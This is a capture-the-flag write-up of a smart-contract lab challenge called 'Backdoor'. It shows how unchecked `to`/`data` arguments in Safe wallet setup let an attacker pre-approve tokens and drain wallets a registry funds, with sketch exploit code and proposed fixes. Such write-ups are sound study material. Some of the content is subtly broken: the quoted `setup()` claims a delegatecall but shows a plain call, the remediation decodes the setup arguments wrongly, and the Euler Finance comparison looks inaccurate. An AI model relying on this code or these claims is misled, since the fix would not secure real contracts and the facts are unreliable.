# Challenge #13: Backdoor

- **Difficulty:** Medium
- **Category:** Safe Setup Manipulation / Factory Exploit
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

`WalletRegistry` deploys Safe wallets for four users, funding each with 10 DVT. It validates that each Safe is initialized with the correct owner, threshold (1), and fallback manager — but it does **not** validate the `to` and `data` parameters of `Safe.setup()`.

## Vulnerability

Safe's `setup()` function accepts `to` and `data` parameters for an optional delegatecall during initialization:

```solidity
function setup(address[] calldata _owners, uint256 _threshold,
    address to, bytes calldata data, ...) external {
    // ... validation of owners and threshold
    if (to != address(0)) {
        // Execute delegatecall during setup
        require(to.call(data).success);
    }
}
```

The registry validates `_owners`, `_threshold`, and `fallbackManager` but ignores `to` and `data`. This allows an attacker to embed arbitrary delegatecall execution in the Safe setup.

## Exploit Walkthrough

```solidity
// Helper contract that approves tokens in the caller's context (via delegatecall)
contract BackdoorHelper {
    function approve(DamnValuableToken token, address spender) external {
        token.approve(spender, type(uint256).max);
    }
}

// Attacker deploys Safes with malicious setup data
for (uint256 i = 0; i < 4; i++) {
    address safeAddress = ...;  // Predict via Safe proxy factory
    
    // Setup data: delegatecall to helper.approve(token, address(this))
    bytes memory setupData = abi.encodeCall(
        helper.approve, (token, address(this))
    );
    
    // Registry deploys Safe with our setup data
    // Safe executes delegatecall → approves attacker for max tokens
    registry.createProxy{...}(owners[i], setupData, ...);
    
    // Drain the 10 DVT the registry just funded
    token.transferFrom(safeAddress, recovery, 10e18);
}
```

The attack works because:
1. The Safe is created and set up with our `to/data` parameters
2. During setup, the Safe delegatecalls our helper → approves attacker for max DVT
3. The registry validates owners/threshold (passes) and funds the Safe with 10 DVT
4. The attacker transfers the DVT out via `transferFrom` using the pre-approved allowance

## Real-World Impact

Safe factory supply chain attacks are an active threat vector. While the Safe team has addressed this by restricting `to/data` parameters in newer factory versions, **deployment script vulnerabilities** remain a concern. The **Euler Finance** exploit (March 2023) involved manipulating flash loan callbacks in a similar initialization context.

## Remediation

```solidity
// FIX 1: Validate to/data parameters
function validateSetup(bytes calldata setupData) internal pure {
    // Ensure to = address(0) and data = ""
    (address to, bytes memory data) = abi.decode(setupData[4:], (address, bytes));
    require(to == address(0), "Unexpected setup target");
    require(data.length == 0, "Unexpected setup data");
}

// FIX 2: Use a Safe factory that doesn't support arbitrary setup
// FIX 3: Deploy Safes first, then fund after independent verification
```

## Key Takeaway

> **When deploying wallets on behalf of users, validate ALL setup parameters — especially `to` and `data` which enable arbitrary code execution during initialization. Fund wallets AFTER verifying their state, not during creation.**
